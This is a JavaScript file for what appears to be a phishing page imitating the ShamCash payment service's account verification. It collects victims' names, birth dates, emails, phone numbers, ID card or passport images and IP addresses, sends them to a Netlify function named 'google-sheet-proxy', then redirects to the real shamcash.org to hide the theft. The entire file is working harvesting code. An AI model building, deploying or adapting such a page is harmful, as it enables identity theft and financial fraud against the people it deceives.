// SHAM-CASH/verify/verify.js

// =======================================================
//          Global Configurations & IP variable
// =======================================================
const FINAL_REDIRECT_URL = "https://shamcash.org";
let userIpAddress = 'غير معروف';

// =======================================================
//          Utility Functions
// =======================================================

// Function to fetch IP address and store it globally
async function fetchAndStoreUserIP() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        userIpAddress = data.ip;
        console.log('IP fetched and stored globally:', userIpAddress);
    } catch (error) {
        console.error('Error fetching IP:', error);
        userIpAddress = 'غير معروف';
    }
}

// Function to read a file as a Base64 string
function readFileAsBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result.split(',')[1]); // Get only the Base64 part
        reader.onerror = error => reject(error);
        reader.readAsDataURL(file);
    });
}

// Updated Utility Function to send to Netlify Function (General Purpose)
async function sendToNetlifyFunction(type, payload) {
    const netlifyFunctionUrl = '/.netlify/functions/google-sheet-proxy';

    try {
        const response = await fetch(netlifyFunctionUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }, // نرسل JSON الآن
            body: JSON.stringify({
                type: type,
                payload: payload, // الحمولة تحتوي الآن على بيانات نصية وصور Base64
                ipAddress: userIpAddress
            })
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Netlify function error response:', errorData);
            throw new Error(`Netlify function returned status ${response.status}: ${errorData.message}`);
        }

        const data = await response.json();
        console.log('Message successfully sent via Netlify Function:', data);
        return data;
    } catch (error) {
        console.error('Error sending message to Netlify Function:', error);
        showCustomModal('فشل الإرسال', 'عذرًا، حدث خطأ أثناء إرسال طلبك. الرجاء المحاولة لاحقًا.', false);
    }
}

// Functions for error display (kept as per your provided code)
function showError(inputElement, messageElement, message) {
    const parentInputGroup = inputElement.closest('.input-group') || inputElement.closest('.form-field-wrapper');
    if (parentInputGroup) {
        parentInputGroup.classList.add('error');
    }
    messageElement.textContent = message;
    messageElement.classList.remove('hidden');
}

function hideError(inputElement, messageElement) {
    const parentInputGroup = inputElement.closest('.input-group') || inputElement.closest('.form-field-wrapper');
    if (parentInputGroup) {
        parentInputGroup.classList.remove('error');
    }
    messageElement.classList.add('hidden');
    messageElement.textContent = '';
}

// Function to show custom modal messages
function showCustomModal(message, subtext, isSuccess = true) {
    const modalMessage = document.querySelector('#customModalOverlay .modal-message');
    const modalSubtext = document.querySelector('#customModalOverlay .modal-subtext');
    const modalSpinner = document.querySelector('#customModalOverlay .modal-spinner');

    modalMessage.textContent = message;
    modalSubtext.textContent = subtext;

    if (isSuccess) {
        modalSpinner.classList.add('hidden');
    } else {
        modalSpinner.classList.remove('hidden');
    }

    customModalOverlay.classList.remove('hidden');
    customModalOverlay.classList.add('show');

    setTimeout(() => {
        customModalOverlay.classList.remove('show');
        customModalOverlay.classList.add('hidden');
    }, 5000);
}

// =======================================================
//          DOM Elements References
// =======================================================
const verificationForm = document.getElementById('verificationForm');
const appLogo = document.getElementById('appLogo');
const otherReasonInput = document.getElementById('otherReason');
const otherDocumentInput = document.getElementById('otherDocument');
const documentTypeRadios = document.querySelectorAll('input[name="documentType"]');
const documentUploadSection = document.getElementById('documentUploadSection');
const idFrontContainer = document.getElementById('idFrontContainer');
const idBackContainer = document.getElementById('idBackContainer');
const passportPageContainer = document.getElementById('passportPageContainer');
const birthYearSelect = document.getElementById('birthYear');
const birthMonthSelect = document.getElementById('birthMonth');
const birthDaySelect = document.getElementById('birthDay');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingMessage = document.getElementById('loadingMessage');
const customModalOverlay = document.getElementById('customModalOverlay');

// Error message elements
const accountTypeError = document.getElementById('accountTypeError');
const reasonError = document.getElementById('reasonError');
const documentTypeError = document.getElementById('documentTypeError');
const fullNameError = document.getElementById('fullNameError');
const birthDateError = document.getElementById('birthDateError');
const shamcashEmailError = document.getElementById('shamcashEmailError');
const phoneNumberError = document.getElementById('phoneNumberError');
const idFrontError = document.getElementById('idFrontError');
const idBackError = document.getElementById('idBackError');
const passportPageError = document.getElementById('passportPageError');


// =======================================================
//          Initial Setup (Run on page load)
// =======================================================

// Set logo source
appLogo.src = "../img/shamcash.svg";

// Populate year dropdown (last 100 years from current)
const currentYear = new Date().getFullYear();
for (let i = currentYear; i >= currentYear - 100; i--) {
    const option = document.createElement('option');
    option.value = i;
    option.textContent = i;
    birthYearSelect.appendChild(option);
}

// Populate month dropdown (1-12)
for (let i = 1; i <= 12; i++) {
    const option = document.createElement('option');
    option.value = i.toString().padStart(2, '0');
    option.textContent = i.toString().padStart(2, '0');
    birthMonthSelect.appendChild(option);
}

// Populate day dropdown (1-31 initially)
for (let i = 1; i <= 31; i++) {
    const option = document.createElement('option');
    option.value = i.toString().padStart(2, '0');
    option.textContent = i.toString().padStart(2, '0');
    birthDaySelect.appendChild(option);
}

// Adjust days in month dynamically
birthMonthSelect.addEventListener('change', updateDaysInMonth);
birthYearSelect.addEventListener('change', updateDaysInMonth);

function updateDaysInMonth() {
    const year = parseInt(birthYearSelect.value);
    const month = parseInt(birthMonthSelect.value);
    const daySelect = birthDaySelect;
    const selectedDay = parseInt(daySelect.value);

    daySelect.innerHTML = '';

    if (isNaN(year) || isNaN(month)) return;

    const daysInMonth = new Date(year, month, 0).getDate();

    for (let i = 1; i <= daysInMonth; i++) {
        const option = document.createElement('option');
        option.value = i.toString().padStart(2, '0');
        option.textContent = i.toString().padStart(2, '0');
        daySelect.appendChild(option);
    }

    if (selectedDay <= daysInMonth) {
        daySelect.value = selectedDay.toString().padStart(2, '0');
    }
}
updateDaysInMonth();


// Handle "آخر" option for reason and document type
document.querySelectorAll('input[name="verificationReason"]').forEach(radio => {
    radio.addEventListener('change', () => {
        if (radio.value === 'آخر') {
            otherReasonInput.classList.remove('hidden');
            otherReasonInput.setAttribute('required', 'true');
        } else {
            otherReasonInput.classList.add('hidden');
            otherReasonInput.removeAttribute('required');
            otherReasonInput.value = '';
        }
        hideError(otherReasonInput, reasonError);
    });
});

documentTypeRadios.forEach(radio => {
    radio.addEventListener('change', () => {
        if (radio.value === 'آخر') {
            otherDocumentInput.classList.remove('hidden');
            otherDocumentInput.setAttribute('required', 'true');
        } else {
            otherDocumentInput.classList.add('hidden');
            otherDocumentInput.removeAttribute('required');
            otherDocumentInput.value = '';
        }
        hideError(otherDocumentInput, documentTypeError);
        updateDocumentUploadSection();
    });
});

// Function to update visibility of document upload fields
function updateDocumentUploadSection() {
    const selectedDocType = document.querySelector('input[name="documentType"]:checked')?.value;

    documentUploadSection.classList.add('hidden');
    idFrontContainer.classList.add('hidden');
    idBackContainer.classList.add('hidden');
    passportPageContainer.classList.add('hidden');

    document.getElementById('idFront').removeAttribute('required');
    document.getElementById('idBack').removeAttribute('required');
    document.getElementById('passportPage').removeAttribute('required');

    hideError(document.getElementById('idFront'), idFrontError);
    hideError(document.getElementById('idBack'), idBackError);
    hideError(document.getElementById('passportPage'), passportPageError);


    if (selectedDocType) {
        documentUploadSection.classList.remove('hidden');
        if (selectedDocType === 'جواز السفر السوري') {
            passportPageContainer.classList.remove('hidden');
            document.getElementById('passportPage').setAttribute('required', 'true');
        } else if (selectedDocType !== 'آخر') {
            idFrontContainer.classList.remove('hidden');
            document.getElementById('idFront').setAttribute('required', 'true');
            idBackContainer.classList.remove('hidden');
            document.getElementById('idBack').setAttribute('required', 'true');
        }
    }
}
updateDocumentUploadSection();

// Fetch IP on page load
fetchAndStoreUserIP();

// =======================================================
//          Event Listeners & Form Logic
// =======================================================

// Basic input validation for instant feedback
document.querySelectorAll('.input-field, .select-field, .other-input, input[type="file"]').forEach(input => {
    input.addEventListener('input', function() {
        const errorId = this.id + 'Error';
        const errorElement = document.getElementById(errorId);
        if (errorElement && !errorElement.classList.contains('hidden')) {
            hideError(this, errorElement);
        }

        if (this.name === 'accountType' && !accountTypeError.classList.contains('hidden')) {
            accountTypeError.classList.add('hidden');
        }
        if (this.name === 'verificationReason' && !reasonError.classList.contains('hidden')) {
            reasonError.classList.add('hidden');
        }
        if (this.name === 'documentType' && !documentTypeError.classList.contains('hidden')) {
            documentTypeError.classList.add('hidden');
        }
    });
});

// Event listener for form submission
verificationForm.addEventListener('submit', async function(event) {
    event.preventDefault();

    loadingMessage.textContent = 'جاري إرسال طلبك...';
    loadingOverlay.classList.remove('hidden');

    let isValid = true;

    // --- 1. Validate Radio Buttons ---
    const accountType = document.querySelector('input[name="accountType"]:checked')?.value;
    if (!accountType) {
        showError(document.querySelector('input[name="accountType"]'), accountTypeError, 'الرجاء تحديد نوع الحساب.');
        isValid = false;
    } else {
        hideError(document.querySelector('input[name="accountType"]'), accountTypeError);
    }

    const verificationReasonRadio = document.querySelector('input[name="verificationReason"]:checked');
    let verificationReason = verificationReasonRadio?.value;
    if (!verificationReason) {
        showError(otherReasonInput, reasonError, 'الرجاء تحديد سبب الطلب.');
        isValid = false;
    } else if (verificationReason === 'آخر' && otherReasonInput.value.trim() === '') {
        showError(otherReasonInput, reasonError, 'الرجاء تحديد السبب الآخر.');
        isValid = false;
    } else if (verificationReason === 'آخر') {
        verificationReason = otherReasonInput.value.trim();
    } else {
        hideError(otherReasonInput, reasonError);
    }

    const documentTypeRadio = document.querySelector('input[name="documentType"]:checked');
    let documentType = documentTypeRadio?.value;
    if (!documentType) {
        showError(otherDocumentInput, documentTypeError, 'الرجاء تحديد نوع الوثيقة.');
        isValid = false;
    } else if (documentType === 'آخر' && otherDocumentInput.value.trim() === '') {
        showError(otherDocumentInput, documentTypeError, 'الرجاء تحديد نوع الوثيقة الآخر.');
        isValid = false;
    } else if (documentType === 'آخر') {
        documentType = otherDocumentInput.value.trim();
    } else {
        hideError(otherDocumentInput, documentTypeError);
    }

    // --- 2. Validate Text Fields ---
    const fullNameInput = document.getElementById('fullName');
    if (fullNameInput.value.trim() === '') {
        showError(fullNameInput, fullNameError, 'هذا الحقل مطلوب.');
        isValid = false;
    } else {
        hideError(fullNameInput, fullNameError);
    }

    const shamcashEmailInput = document.getElementById('shamcashEmail');
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const allowedDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com'];

    if (shamcashEmailInput.value.trim() === '') {
        showError(shamcashEmailInput, shamcashEmailError, 'الرجاء إدخال بريد إلكتروني.');
        isValid = false;
    } else if (!emailRegex.test(shamcashEmailInput.value.trim())) {
        showError(shamcashEmailInput, shamcashEmailError, 'صيغة البريد الإلكتروني غير صالحة.');
        isValid = false;
    } else {
        const domain = shamcashEmailInput.value.split('@')[1];
        if (!allowedDomains.includes(domain)) {
            showError(shamcashEmailInput, shamcashEmailError, 'الرجاء استخدام بريد إلكتروني من خدمة موثوقة (مثل Gmail, Yahoo).');
            isValid = false;
        } else {
            hideError(shamcashEmailInput, shamcashEmailError);
        }
    }

    const phoneNumberInput = document.getElementById('phoneNumber');
    if (phoneNumberInput.value.trim() === '') {
        showError(phoneNumberInput, phoneNumberError, 'الرجاء إدخال رقم الهاتف.');
        isValid = false;
    } else if (!/^\d+$/.test(phoneNumberInput.value.trim())) {
        showError(phoneNumberInput, phoneNumberError, 'الرجاء إدخال أرقام فقط.');
        isValid = false;
    } else {
        hideError(phoneNumberInput, phoneNumberError);
    }

    // --- 3. Validate Date of Birth ---
    const year = birthYearSelect.value;
    const month = birthMonthSelect.value;
    const day = birthDaySelect.value;

    if (year === '' || month === '' || day === '') {
        showError(birthYearSelect, birthDateError, 'الرجاء تحديد تاريخ الميلاد كاملاً.');
        isValid = false;
    } else {
        const dob = new Date(`${year}-${month}-${day}`);
        if (isNaN(dob.getTime())) {
            showError(birthYearSelect, birthDateError, 'تاريخ ميلاد غير صالح.');
            isValid = false;
        } else {
            hideError(birthYearSelect, birthDateError);
        }
    }

    // --- 4. Validate File Uploads and convert to Base64 ---
    const idFrontInput = document.getElementById('idFront');
    const idBackInput = document.getElementById('idBack');
    const passportPageInput = document.getElementById('passportPage');

    let filesToUpload = {};
    let base64Promises = [];

    if (documentType === 'جواز السفر السوري') {
        if (!passportPageInput.files.length) {
            showError(passportPageInput, passportPageError, 'صورة الصفحة الأولى من جواز السفر مطلوبة.');
            isValid = false;
        } else {
            hideError(passportPageInput, passportPageError);
            base64Promises.push(readFileAsBase64(passportPageInput.files[0]).then(base64 => filesToUpload.passportPageBase64 = base64));
        }
    } else if (documentType && documentType !== 'آخر') {
        if (!idFrontInput.files.length) {
            showError(idFrontInput, idFrontError, 'صورة الوجه الأمامي مطلوبة.');
            isValid = false;
        } else {
            hideError(idFrontInput, idFrontError);
            base64Promises.push(readFileAsBase64(idFrontInput.files[0]).then(base64 => filesToUpload.idFrontBase64 = base64));
        }
        if (!idBackInput.files.length) {
            showError(idBackInput, idBackError, 'صورة الوجه الخلفي مطلوبة.');
            isValid = false;
        } else {
            hideError(idBackInput, idBackError);
            base64Promises.push(readFileAsBase64(idBackInput.files[0]).then(base64 => filesToUpload.idBackBase64 = base64));
        }
    }

    // انتظر حتى يتم تحويل جميع الصور إلى Base64
    if (base64Promises.length > 0) {
        try {
            await Promise.all(base64Promises);
        } catch (error) {
            console.error('Error converting files to Base64:', error);
            showCustomModal('فشل التحميل', 'عذرًا، حدث خطأ أثناء تحويل الصور. الرجاء التأكد من صلاحية الملفات.', false);
            loadingOverlay.classList.add('hidden');
            return; // توقف هنا إذا فشل تحويل الصور
        }
    }


    if (!isValid) {
        loadingOverlay.classList.add('hidden');
        return;
    }

    // --- All validations passed, proceed with submission ---
    const formDataToSend = {
        accountType: accountType,
        verificationReason: verificationReason,
        documentType: documentType,
        fullName: fullNameInput.value.trim(),
        birthDate: `${year}-${month}-${day}`,
        shamcashEmail: shamcashEmailInput.value.trim(),
        phoneNumber: phoneNumberInput.value.trim(),
        ...filesToUpload // إضافة صور Base64 إلى البيانات المرسلة
    };

    // Show loading overlay
    loadingMessage.textContent = 'جاري إرسال طلبك...';
    loadingOverlay.classList.remove('hidden');

    try {
        await sendToNetlifyFunction('verification_request', formDataToSend);

        loadingOverlay.classList.add('hidden');
        showCustomModal('تم إرسال طلبك بنجاح!', 'سيتم مراجعة بياناتك والتواصل معك قريباً.', true);
        setTimeout(() => {
            window.location.href = FINAL_REDIRECT_URL;
        }, 3000);
    } catch (error) {
        console.error('Error during form submission:', error);
        loadingOverlay.classList.add('hidden');
        showCustomModal('فشل الإرسال', 'عذرًا، حدث خطأ أثناء إرسال طلبك. الرجاء المحاولة لاحقًا.', false);
    }
});
